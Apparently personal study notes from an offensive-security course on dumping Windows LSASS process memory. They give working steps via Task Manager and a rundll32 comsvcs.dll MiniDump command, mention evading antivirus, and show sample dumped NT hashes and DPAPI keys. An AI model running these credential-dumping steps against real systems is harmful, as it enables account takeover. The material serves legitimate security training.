# Overview on LSASS

In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service).

Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.

## Securable Objects
In Windows, **securable objects** are resources that the operating system protects through **Access Control Lists (ACLs)** and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.

## LSASS Process Memory dump
Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K

### Through task manager
1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`
5. ![[taskmanagerdump.webp]]

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host.

# Through rundll32
This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

Finding LSASS's PID in cmd

```cmd-session
> tasklist /svc
```

Finding LSASS's PID in  powershell
```powershell-session
system32> Get-Process lsass

ID
672
```
Creating a dump file using PowerShell
```powershell-session
system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).

# LSA Inners (dumped content)
#### MSV
```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
#### WDIGEST

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text.
#### Kerberos

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments.
Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. 
LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos
#### DPAPI
```shell-session
== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```
Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. covered in privEsc
